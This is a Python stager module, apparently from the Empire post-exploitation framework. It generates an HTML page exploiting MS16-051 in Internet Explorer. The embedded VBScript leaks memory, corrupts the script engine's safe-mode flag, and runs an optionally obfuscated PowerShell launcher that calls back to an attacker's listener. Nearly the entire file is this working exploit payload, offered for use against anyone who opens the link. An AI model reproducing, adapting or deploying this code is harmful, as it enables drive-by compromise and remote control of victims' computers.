from lib.common import helpers

class Stager:

    def __init__(self, mainMenu, params=[]):

        self.info = {
            'Name': 'MS16-051 IE RCE',

            'Author': ['www.cgsec.co.uk'],

            'Description': ('Leverages MS16-051 to execute powershell in unpatched browsers. This is a file-less vector which works on IE9/10/11 and all versions of Windows.'),

            'Comments': [
                'Target will have to open link with vulnerable version of IE.'
            ]
        }

        # any options needed by the stager, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Listener': {
                'Description':   'Listener to generate stager for.',
                'Required':   True,
                'Value':   ''
            },
            'Language' : {
                'Description'   :   'Language of the stager to generate.',
                'Required'      :   True,
                'Value'         :   'powershell'
            },
            'StagerRetries': {
                'Description':   'Times for the stager to retry connecting.',
                'Required':   False,
                'Value':   '0'
            },
            'Base64' : {
                'Description'   :   'Switch. Base64 encode the output.',
                'Required'      :   True,
                'Value'         :   'True'
            },
            'Obfuscate' : {
                'Description'   :   'Switch. Obfuscate the launcher powershell code, uses the ObfuscateCommand for obfuscation types. For powershell only.',
                'Required'      :   False,
                'Value'         :   'False'
            },
            'ObfuscateCommand' : {
                'Description'   :   'The Invoke-Obfuscation command to use. Only used if Obfuscate switch is True. For powershell only.',
                'Required'      :   False,
                'Value'         :   r'Token\All\1,Launcher\STDIN++\12467'
            },
            'OutFile': {
                'Description':   'File to output JS to, otherwise displayed on the screen.',
                'Required':   False,
                'Value':   '/tmp/index.html'
            },
            'UserAgent': {
                'Description':   'User-agent string to use for the staging request (default, none, or other).',
                'Required':   False,
                'Value':   'default'
            },
            'Proxy': {
                'Description':   'Proxy to use for request (default, none, or other).',
                'Required':   False,
                'Value':   'default'
            },
            'ProxyCreds': {
                'Description':   'Proxy credentials ([domain\]username:password) to use for request (default, none, or other).',
                'Required':   False,
                'Value':   'default'
            }
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu

        for param in params:
            # parameter format is [Name, Value]
            option, value = param
            if option in self.options:
                self.options[option]['Value'] = value

    def generate(self):

        # extract all of our options
        language = self.options['Language']['Value']
        listenerName = self.options['Listener']['Value']
        base64 = self.options['Base64']['Value']
        obfuscate = self.options['Obfuscate']['Value']
        obfuscateCommand = self.options['ObfuscateCommand']['Value']
        userAgent = self.options['UserAgent']['Value']
        proxy = self.options['Proxy']['Value']
        proxyCreds = self.options['ProxyCreds']['Value']
        stagerRetries = self.options['StagerRetries']['Value']

        encode = False
        if base64.lower() == "true":
            encode = True
            
        obfuscateScript = False
        if obfuscate.lower() == "true":
            obfuscateScript = True

        # generate the launcher code
        launcher = self.mainMenu.stagers.generate_launcher(
            listenerName, language=language, encode=encode, obfuscate=obfuscateScript, obfuscationCommand=obfuscateCommand, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds, stagerRetries=stagerRetries)
        if launcher == "":
            print helpers.color("[!] Error in launcher command generation.")
            return ""
        else:
		code =  "<html>\n"
		code += "<head>\n"
		code += "<meta http-equiv=\"x-ua-compatible\" content=\"IE=10\">\n"
		code += "</head>\n"
		code += "<body>\n"
		code += "    <script type=\"text/vbscript\">\n"
		code += "        Dim aw\n"
		code += "        Dim plunge(32)\n"
		code += "        Dim y(32)\n"
		code += "        prefix = \"%u4141%u4141\"\n"
		code += "        d = prefix & \"%u0016%u4141%u4141%u4141%u4242%u4242\"\n"
		code += "        b = String(64000, \"D\")\n"
		code += "        c = d & b\n"
		code += "        x = UnEscape(c)\n"
		code += "		\n"
		code += "        Class ArrayWrapper\n"
		code += "            Dim A()\n"
		code += "            Private Sub Class_Initialize\n"
		code += "                  ReDim Preserve A(1, 2000)\n"
		code += "            End Sub\n"
		code += "			\n"
		code += "            Public Sub Resize()\n"
		code += "                ReDim Preserve A(1, 1)\n"
		code += "            End Sub\n"
		code += "        End Class\n"
		code += "		\n"
		code += "        Class Dummy\n"
		code += "        End Class\n"
		code += "		\n"
		code += "        Function getAddr (arg1, s)\n"
		code += "            aw = Null\n"
		code += "            Set aw = New ArrayWrapper\n"
		code += "		\n"
		code += "            For i = 0 To 32\n"
		code += "                Set plunge(i) = s\n"
		code += "            Next\n"
		code += "		\n"
		code += "            Set aw.A(arg1, 2) = s\n"
		code += "		\n"
		code += "            Dim addr\n"
		code += "            Dim i\n"
		code += "            For i = 0 To 31\n"
		code += "                If Asc(Mid(y(i), 3, 1)) = VarType(s) Then\n"
		code += "                   addr = strToInt(Mid(y(i), 3 + 4, 2))\n"
		code += "                End If\n"
		code += "                y(i) = Null\n"
		code += "            Next\n"
		code += "		\n"
		code += "            If addr = Null Then\n"
		code += "                document.location.href = document.location.href\n"
		code += "                Return\n"
		code += "            End If\n"
		code += "            getAddr = addr\n"
		code += "        End Function\n"
		code += "		\n"
		code += "        Function leakMem (arg1, addr)\n"
		code += "            d = prefix & \"%u0008%u4141%u4141%u4141\"\n"
		code += "            c = d & intToStr(addr) & b\n"
		code += "            x = UnEscape(c)\n"
		code += "		\n"
		code += "            aw = Null\n"
		code += "            Set aw = New ArrayWrapper\n"
		code += "		\n"
		code += "            Dim o\n"
		code += "            o = aw.A(arg1, 2)\n"
		code += "		\n"
		code += "            leakMem = o\n"
		code += "        End Function\n"
		code += "		\n"
		code += "        Sub overwrite (arg1, addr)\n"
		code += "            d = prefix & \"%u400C%u0000%u0000%u0000\"\n"
		code += "            c = d & intToStr(addr) & b\n"
		code += "            x = UnEscape(c)\n"
		code += "		\n"
		code += "            aw = Null\n"
		code += "            Set aw = New ArrayWrapper\n"
		code += "		\n"
		code += "		\n"
		code += "            aw.A(arg1, 2) = CSng(0)\n"
		code += "        End Sub\n"
		code += "		\n"
		code += "        Function exploit (arg1)\n"
		code += "            Dim addr\n"
		code += "            Dim csession\n"
		code += "            Dim olescript\n"
		code += "            Dim mem\n"
		code += "		\n"
		code += "		\n"
		code += "            Set dm = New Dummy\n"
		code += "		\n"
		code += "            addr = getAddr(arg1, dm)\n"
		code += "		\n"
		code += "            mem = leakMem(arg1, addr + 8)\n"
		code += "            csession = strToInt(Mid(mem, 3, 2))\n"
		code += "		\n"
		code += "            mem = leakMem(arg1, csession + 4)\n"
		code += "            olescript = strToInt(Mid(mem, 1, 2))\n"
		code += "            overwrite arg1, olescript + &H174\n"
		code += "	    Set Object = CreateObject(\"Wscript.Shell\")\n"
		code +=	"		Object.run(\""
		code += 		launcher + 	"\")\n"
		code += "        End Function\n"
		code += "		\n"
		code += "        Function triggerBug\n"
		code += "            aw.Resize()\n"
		code += "            Dim i\n"
		code += "            For i = 0 To 32\n"
		code += "                ' 24000x2 + 6 = 48006 bytes\n"
		code += "                y(i) = Mid(x, 1, 24000)\n"
		code += "            Next\n"
		code += "        End Function\n"
		code += "    </script>\n"
		code += "		\n"
		code += "    <script type=\"text/javascript\">\n"
		code += "        function strToInt(s)\n"
		code += "        {\n"
		code += "            return s.charCodeAt(0) | (s.charCodeAt(1) << 16);\n"
		code += "        }\n"
		code += "        function intToStr(x)\n"
		code += "        {\n"
		code += "            return String.fromCharCode(x & 0xffff) + String.fromCharCode(x >> 16);\n"
		code += "        }\n"
		code += "        var o;\n"
		code += "        o = {\"valueOf\": function () {\n"
		code += "                triggerBug();\n"
		code += "                return 1;\n"
		code += "            }};\n"
		code += "        setTimeout(function() {exploit(o);}, 50);\n"
		code += "    </script>\n"
		code += "</body>\n"
		code += "</html>"

	return code            